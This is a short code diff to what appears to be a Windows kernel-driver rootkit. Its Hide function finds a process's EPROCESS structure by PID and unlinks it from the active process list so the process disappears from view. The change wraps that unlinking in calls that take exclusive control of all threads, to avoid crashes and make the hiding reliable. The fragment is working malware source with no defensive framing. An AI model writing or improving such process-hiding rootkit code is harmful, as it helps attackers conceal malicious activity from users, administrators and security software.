@@ -177,7 +177,11 @@ static NTSTATUS Hide(ULONG pid) {
 
 	DWORD eproc = 0;
 	PLIST_ENTRY plist_active_procs;
-
+	//
+	// Gain thread exclusivity
+	//
+	PKDPC pkdpc = Sync::GainAllThreadExclusive();
+	
 	KdPrint(("Finding EPROC struct with PID...\n"));
 	eproc = Utilities::FindProcEproc(pid);
 
@@ -198,6 +202,11 @@ static NTSTATUS Hide(ULONG pid) {
 	// Proevents Random BSODS
 	plist_active_procs->Flink = (LIST_ENTRY*)&(plist_active_procs->Flink);
 	plist_active_procs->Blink = (LIST_ENTRY*)&(plist_active_procs->Blink);
+	//
+	// Release all thread exclusivity safely
+	//
+
+	Sync::ReleaseAllThreadExclusive(pkdpc);
 
 	KdPrint(("Sucessfully Hid process...\n"));
 
